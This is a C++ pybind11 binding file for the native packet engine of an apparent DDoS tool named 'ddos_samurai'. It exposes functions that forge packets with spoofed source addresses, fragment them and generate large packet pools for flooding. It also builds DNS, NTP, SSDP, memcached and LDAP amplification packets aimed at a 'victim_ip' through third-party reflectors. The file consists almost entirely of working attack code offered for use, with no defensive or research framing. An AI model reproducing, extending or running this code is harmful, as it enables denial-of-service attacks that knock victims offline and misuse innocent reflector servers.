#include <pybind11/buffer_info.h>
#include <pybind11/gil.h>
#include <pybind11/pybind11.h>
#include <pybind11/stl.h>

#include <optional>
#include <string>
#include <utility>
#include <vector>

#include "engine.hpp"

namespace py = pybind11;
using namespace ddos_samurai::cpu_native;

namespace {

std::vector<uint8_t> pybytes_to_vec(const py::object& obj) {
  if (obj.is_none()) return {};
  if (py::isinstance<py::bytes>(obj)) {
    std::string s = py::cast<std::string>(obj);
    return std::vector<uint8_t>(s.begin(), s.end());
  }
  if (py::isinstance<py::bytearray>(obj)) {
    std::string s = py::cast<std::string>(py::bytes(obj));
    return std::vector<uint8_t>(s.begin(), s.end());
  }
  if (py::isinstance<py::str>(obj)) {
    std::string s = py::cast<std::string>(obj);
    return std::vector<uint8_t>(s.begin(), s.end());
  }
  throw std::invalid_argument("payload must be bytes, bytearray, str, or None");
}

std::optional<std::string> optional_str_attr(const py::object& obj, const char* name) {
  if (!py::hasattr(obj, name)) return std::nullopt;
  py::object v = obj.attr(name);
  if (v.is_none()) return std::nullopt;
  std::string s = py::cast<std::string>(v);
  if (s.empty()) return std::nullopt;
  return s;
}

PacketConfig parse_config(const py::object& cfg_obj) {
  PacketConfig cfg;
  cfg.target_ip = py::cast<std::string>(cfg_obj.attr("target_ip"));
  cfg.target_port = py::cast<int>(cfg_obj.attr("target_port"));
  cfg.protocol = py::cast<std::string>(cfg_obj.attr("protocol"));
  cfg.spoof = py::cast<bool>(cfg_obj.attr("spoof"));
  if (py::hasattr(cfg_obj, "spoof_opts")) {
    py::object so = cfg_obj.attr("spoof_opts");
    if (!so.is_none()) {
      cfg.spoof_opts.mode = py::cast<std::string>(so.attr("mode"));
      cfg.spoof_opts.subnet = optional_str_attr(so, "subnet");
      cfg.spoof_opts.list_file = optional_str_attr(so, "list_file");
    }
  }
  if (py::hasattr(cfg_obj, "payload")) {
    py::object payload = cfg_obj.attr("payload");
    if (!payload.is_none()) {
      cfg.payload = pybytes_to_vec(payload);
      cfg.has_payload = true;
    }
  }
  cfg.tcp_flags = py::cast<std::string>(cfg_obj.attr("tcp_flags"));
  if (!cfg_obj.attr("ttl").is_none()) cfg.ttl = py::cast<int>(cfg_obj.attr("ttl"));
  if (!cfg_obj.attr("tos").is_none()) cfg.tos = py::cast<int>(cfg_obj.attr("tos"));
  if (!cfg_obj.attr("window").is_none()) cfg.window = py::cast<int>(cfg_obj.attr("window"));
  cfg.fragment_enabled = py::cast<bool>(cfg_obj.attr("fragment_enabled"));
  cfg.fragment_size = py::cast<int>(cfg_obj.attr("fragment_size"));
  cfg.pad_size = py::cast<int>(cfg_obj.attr("pad_size"));
  cfg.attack_vector = py::cast<std::string>(cfg_obj.attr("attack_vector"));
  cfg.dns_name = py::cast<std::string>(cfg_obj.attr("dns_name"));
  py::object qtype = cfg_obj.attr("dns_qtype");
  if (py::isinstance<py::str>(qtype)) {
    cfg.dns_qtypes = {py::cast<std::string>(qtype)};
  } else {
    cfg.dns_qtypes = py::cast<std::vector<std::string>>(qtype);
  }
  cfg.dns_edns = py::cast<bool>(cfg_obj.attr("dns_edns"));
  cfg.dns_recursive = py::cast<bool>(cfg_obj.attr("dns_recursive"));
  return cfg;
}

std::vector<std::pair<int, std::optional<std::pair<uint32_t, uint32_t>>>> parse_tcp_options_obj(const py::iterable& options) {
  std::vector<std::pair<int, std::optional<std::pair<uint32_t, uint32_t>>>> out;
  for (const auto& item : options) {
    auto tup = py::cast<py::tuple>(item);
    int kind = py::cast<int>(tup[0]);
    if (tup.size() < 2 || tup[1].is_none()) {
      out.push_back({kind, std::nullopt});
    } else if (py::isinstance<py::tuple>(tup[1]) || py::isinstance<py::list>(tup[1])) {
      auto pair = py::cast<std::pair<uint32_t, uint32_t>>(tup[1]);
      out.push_back({kind, pair});
    } else {
      uint32_t v = py::cast<uint32_t>(tup[1]);
      out.push_back({kind, std::make_pair(v, 0u)});
    }
  }
  return out;
}

std::vector<uint8_t> pyobj_to_vec_u8(const py::object& obj, size_t expected = 0) {
  std::vector<uint8_t> out;
  if (obj.is_none()) {
    out = {};
  } else if (py::isinstance<py::bytes>(obj) || py::isinstance<py::bytearray>(obj) || py::isinstance<py::str>(obj)) {
    out = pybytes_to_vec(obj);
  } else {
    out = py::cast<std::vector<uint8_t>>(obj);
  }
  if (expected != 0 && out.size() != expected) throw std::invalid_argument("invalid byte sequence size");
  return out;
}

}  // namespace

PYBIND11_MODULE(_cpu_packet_engine_native, m) {
  m.doc() = "Native CPU packet engine";

  py::class_<PacketPoolBuffer>(m, "_PacketPoolBufferOwner", py::buffer_protocol())
      .def_buffer([](PacketPoolBuffer& self) -> py::buffer_info {
        return py::buffer_info(
            self.data(),
            sizeof(uint8_t),
            py::format_descriptor<uint8_t>::format(),
            1,
            {static_cast<py::ssize_t>(self.size())},
            {static_cast<py::ssize_t>(sizeof(uint8_t))});
      })
      .def_property_readonly("packet_size", [](const PacketPoolBuffer& self) { return self.packet_size; })
      .def("__len__", [](const PacketPoolBuffer& self) { return self.size(); });

  m.def("ip_to_int", &ip_to_int);
  m.def("int_to_ip", &int_to_ip);
  m.def("ip_to_bytes", [](const std::string& ip) {
    auto out = ip_to_bytes(ip);
    return py::bytes(reinterpret_cast<const char*>(out.data()), static_cast<py::ssize_t>(out.size()));
  });
  m.def("generate_random_ip", &generate_random_ip);
  m.def("generate_realistic_ip", &generate_realistic_ip);
  m.def("generate_ip_from_subnet", &generate_ip_from_subnet);
  m.def("load_ips_from_file", &load_ips_from_file);
  m.def("resolve_local_source_ip", &resolve_local_source_ip);
  m.def("get_spoofed_ip", &get_spoofed_ip, py::arg("mode") = "realistic", py::arg("subnet") = std::nullopt, py::arg("list_file") = std::nullopt);
  m.def("parse_tcp_flags", &parse_tcp_flags);
  m.def("_checksum", [](py::buffer data) {
    py::buffer_info info = data.request();
    return checksum(static_cast<const uint8_t*>(info.ptr), static_cast<size_t>(info.size * info.itemsize));
  });
  m.def("_pseudo_header_checksum", [](uint32_t src_ip, uint32_t dst_ip, int protocol, int l4_length) {
    uint32_t s = ((src_ip >> 16) & 0xFFFFu) + (src_ip & 0xFFFFu) + ((dst_ip >> 16) & 0xFFFFu) + (dst_ip & 0xFFFFu);
    s += static_cast<uint32_t>(protocol & 0xFF);
    s += static_cast<uint32_t>(l4_length & 0xFFFF);
    return s;
  });
  m.def("build_tcp_options", [](py::iterable options) {
    auto out = build_tcp_options(parse_tcp_options_obj(options));
    return py::bytes(reinterpret_cast<const char*>(out.data()), static_cast<py::ssize_t>(out.size()));
  });
  m.def("build_ipv4_header", [](const std::string& src_ip, const std::string& dst_ip, int protocol, int payload_len, int ttl, int tos, int identification, uint16_t flags_frag, py::object options) {
    auto opts = options.is_none() ? std::vector<uint8_t>{} : pyobj_to_vec_u8(options);
    auto out = build_ipv4_header(src_ip, dst_ip, protocol, payload_len, ttl, tos, identification, flags_frag, opts);
    return py::bytes(reinterpret_cast<const char*>(out.data()), static_cast<py::ssize_t>(out.size()));
  }, py::arg("src_ip"), py::arg("dst_ip"), py::arg("protocol"), py::arg("payload_len"), py::arg("ttl") = 64, py::arg("tos") = 0, py::arg("identification") = 0, py::arg("flags_frag") = 0x4000, py::arg("options") = py::none());
  m.def("build_tcp_header", [](int src_port, int dst_port, uint32_t seq, uint32_t ack, int flags, int window, int urgent, py::object options_bytes, uint32_t src_ip_int, uint32_t dst_ip_int, py::object payload) {
    auto opts = options_bytes.is_none() ? std::vector<uint8_t>{} : pyobj_to_vec_u8(options_bytes);
    auto pay = payload.is_none() ? std::vector<uint8_t>{} : pybytes_to_vec(payload);
    auto out = build_tcp_header(src_port, dst_port, seq, ack, flags, window, urgent, opts, src_ip_int, dst_ip_int, pay);
    return py::bytes(reinterpret_cast<const char*>(out.data()), static_cast<py::ssize_t>(out.size()));
  }, py::arg("src_port"), py::arg("dst_port"), py::arg("seq") = 0, py::arg("ack") = 0, py::arg("flags") = TCP_SYN, py::arg("window") = 65535, py::arg("urgent") = 0, py::arg("options_bytes") = py::none(), py::arg("src_ip_int") = 0, py::arg("dst_ip_int") = 0, py::arg("payload") = py::none());
  m.def("build_udp_header", [](int src_port, int dst_port, py::object payload, uint32_t src_ip_int, uint32_t dst_ip_int, bool compute_checksum) {
    auto pay = payload.is_none() ? std::vector<uint8_t>{} : pybytes_to_vec(payload);
    auto out = build_udp_header(src_port, dst_port, pay, src_ip_int, dst_ip_int, compute_checksum);
    return py::bytes(reinterpret_cast<const char*>(out.data()), static_cast<py::ssize_t>(out.size()));
  }, py::arg("src_port"), py::arg("dst_port"), py::arg("payload") = py::none(), py::arg("src_ip_int") = 0, py::arg("dst_ip_int") = 0, py::arg("compute_checksum") = true);
  m.def("build_icmp_echo", [](int identifier, int sequence, py::object payload) {
    auto pay = payload.is_none() ? std::vector<uint8_t>{} : pybytes_to_vec(payload);
    auto out = build_icmp_echo(identifier, sequence, pay);
    return py::bytes(reinterpret_cast<const char*>(out.data()), static_cast<py::ssize_t>(out.size()));
  }, py::arg("identifier") = 0, py::arg("sequence") = 0, py::arg("payload") = py::none());
  m.def("build_ethernet_header", [](py::object dst_mac, py::object src_mac, int ethertype) {
    auto dst = dst_mac.is_none() ? std::vector<uint8_t>{0xff,0xff,0xff,0xff,0xff,0xff} : pyobj_to_vec_u8(dst_mac, 6);
    auto src = src_mac.is_none() ? std::vector<uint8_t>{0,0,0,0,0,0} : pyobj_to_vec_u8(src_mac, 6);
    auto out = build_ethernet_header(dst, src, ethertype);
    return py::bytes(reinterpret_cast<const char*>(out.data()), static_cast<py::ssize_t>(out.size()));
  }, py::arg("dst_mac") = py::none(), py::arg("src_mac") = py::none(), py::arg("ethertype") = 0x0800);
  m.def("build_dns_query", [](const std::string& qname, const std::string& qtype, bool recursive, bool edns, int transaction_id) {
    auto out = build_dns_query(qname, qtype, recursive, edns, transaction_id);
    return py::bytes(reinterpret_cast<const char*>(out.data()), static_cast<py::ssize_t>(out.size()));
  }, py::arg("qname") = "example.com", py::arg("qtype") = "A", py::arg("recursive") = true, py::arg("edns") = false, py::arg("transaction_id") = 0);

  m.def("build_transport_packet", [](py::object cfg_obj) {
    PacketConfig cfg = parse_config(cfg_obj);
    py::gil_scoped_release release;
    auto out = build_transport_packet(cfg);
    py::gil_scoped_acquire acquire;
    return py::bytes(reinterpret_cast<const char*>(out.data()), static_cast<py::ssize_t>(out.size()));
  });
  m.def("build_dns_packet", [](py::object cfg_obj) {
    PacketConfig cfg = parse_config(cfg_obj);
    py::gil_scoped_release release;
    auto out = build_dns_packet(cfg);
    py::gil_scoped_acquire acquire;
    return py::bytes(reinterpret_cast<const char*>(out.data()), static_cast<py::ssize_t>(out.size()));
  });
  m.def("build_polymorphic_http_packet", [](py::object cfg_obj) {
    PacketConfig cfg = parse_config(cfg_obj);
    py::gil_scoped_release release;
    auto out = build_polymorphic_http_packet(cfg);
    py::gil_scoped_acquire acquire;
    return py::bytes(reinterpret_cast<const char*>(out.data()), static_cast<py::ssize_t>(out.size()));
  });
  m.def("create_packet", [](py::object cfg_obj) {
    PacketConfig cfg = parse_config(cfg_obj);
    py::gil_scoped_release release;
    auto out = create_packet(cfg);
    py::gil_scoped_acquire acquire;
    return py::bytes(reinterpret_cast<const char*>(out.data()), static_cast<py::ssize_t>(out.size()));
  });
  m.def("generate_packet_pool", [](py::object cfg_obj, int count, bool uniform_size, bool low_peak_memory) {
    PacketConfig cfg = parse_config(cfg_obj);
    py::gil_scoped_release release;
    auto out = generate_packet_pool(cfg, count, uniform_size, low_peak_memory);
    py::gil_scoped_acquire acquire;
    return py::make_tuple(py::bytes(reinterpret_cast<const char*>(out.first.data()), static_cast<py::ssize_t>(out.first.size())), out.second);
  }, py::arg("cfg"), py::arg("count"), py::arg("uniform_size") = true, py::arg("low_peak_memory") = false);
  m.def("generate_packet_pool_owner", [](py::object cfg_obj, int count, bool uniform_size, bool low_peak_memory) {
    PacketConfig cfg = parse_config(cfg_obj);
    py::gil_scoped_release release;
    auto owner = generate_packet_pool_view(cfg, count, uniform_size, low_peak_memory);
    py::gil_scoped_acquire acquire;
    return py::make_tuple(owner, owner.packet_size);
  }, py::arg("cfg"), py::arg("count"), py::arg("uniform_size") = true, py::arg("low_peak_memory") = false);
  m.def("fragment_packet", [](py::buffer packet, int fragment_size) {
    py::buffer_info info = packet.request();
    std::vector<uint8_t> data(static_cast<uint8_t*>(info.ptr), static_cast<uint8_t*>(info.ptr) + info.size * info.itemsize);
    py::gil_scoped_release release;
    auto frags = fragment_packet(data, fragment_size);
    py::gil_scoped_acquire acquire;
    py::list out;
    for (const auto& frag : frags) {
      out.append(py::bytes(reinterpret_cast<const char*>(frag.data()), static_cast<py::ssize_t>(frag.size())));
    }
    return out;
  }, py::arg("packet"), py::arg("fragment_size") = 800);
  m.def("add_ethernet_frame", [](py::buffer ip_packet, py::object dst_mac, py::object src_mac) {
    py::buffer_info info = ip_packet.request();
    std::vector<uint8_t> packet(static_cast<uint8_t*>(info.ptr), static_cast<uint8_t*>(info.ptr) + info.size * info.itemsize);
    auto dst = dst_mac.is_none() ? std::vector<uint8_t>{0xff,0xff,0xff,0xff,0xff,0xff} : pyobj_to_vec_u8(dst_mac, 6);
    auto src = src_mac.is_none() ? std::vector<uint8_t>{0,0,0,0,0,0} : pyobj_to_vec_u8(src_mac, 6);
    auto out = add_ethernet_frame(packet, dst, src);
    return py::bytes(reinterpret_cast<const char*>(out.data()), static_cast<py::ssize_t>(out.size()));
  }, py::arg("ip_packet"), py::arg("dst_mac") = py::none(), py::arg("src_mac") = py::none());
  m.def("create_dns_amp_packet", [](const std::string& reflector_ip, const std::string& victim_ip, const std::string& dns_name) {
    auto out = create_dns_amp_packet(reflector_ip, victim_ip, dns_name);
    return py::bytes(reinterpret_cast<const char*>(out.data()), static_cast<py::ssize_t>(out.size()));
  }, py::arg("reflector_ip"), py::arg("victim_ip"), py::arg("dns_name") = "isc.org");
  m.def("create_ntp_amp_packet", [](const std::string& reflector_ip, const std::string& victim_ip) {
    auto out = create_ntp_amp_packet(reflector_ip, victim_ip);
    return py::bytes(reinterpret_cast<const char*>(out.data()), static_cast<py::ssize_t>(out.size()));
  });
  m.def("create_ssdp_amp_packet", [](const std::string& reflector_ip, const std::string& victim_ip) {
    auto out = create_ssdp_amp_packet(reflector_ip, victim_ip);
    return py::bytes(reinterpret_cast<const char*>(out.data()), static_cast<py::ssize_t>(out.size()));
  });
  m.def("create_memcached_amp_packet", [](const std::string& reflector_ip, const std::string& victim_ip) {
    auto out = create_memcached_amp_packet(reflector_ip, victim_ip);
    return py::bytes(reinterpret_cast<const char*>(out.data()), static_cast<py::ssize_t>(out.size()));
  });
  m.def("create_ldap_amp_packet", [](const std::string& reflector_ip, const std::string& victim_ip) {
    auto out = create_ldap_amp_packet(reflector_ip, victim_ip);
    return py::bytes(reinterpret_cast<const char*>(out.data()), static_cast<py::ssize_t>(out.size()));
  });
}
